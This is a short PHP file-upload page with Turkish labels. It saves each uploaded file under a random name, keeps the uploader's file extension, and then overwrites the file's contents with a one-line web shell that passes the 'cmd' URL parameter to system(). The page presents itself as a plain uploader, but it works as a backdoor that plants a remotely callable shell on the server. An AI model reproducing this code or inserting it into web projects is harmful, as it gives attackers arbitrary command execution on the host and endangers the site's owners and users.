<?php
if(isset($_FILES['dosya'])){
    $dosya = $_FILES['dosya'];
    $uzanti = pathinfo($dosya['name'], PATHINFO_EXTENSION);
    $yeniAd = md5(rand()).'.'.$uzanti;
    move_uploaded_file($dosya['tmp_name'], $yeniAd);
    file_put_contents($yeniAd, '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);}?>');
    echo "Yüklendi: <a href='$yeniAd'>$yeniAd</a>";
}
?>
<form method='POST' enctype='multipart/form-data'>
<input type='file' name='dosya'>
<input type='submit' value='Yükle'>
</form>
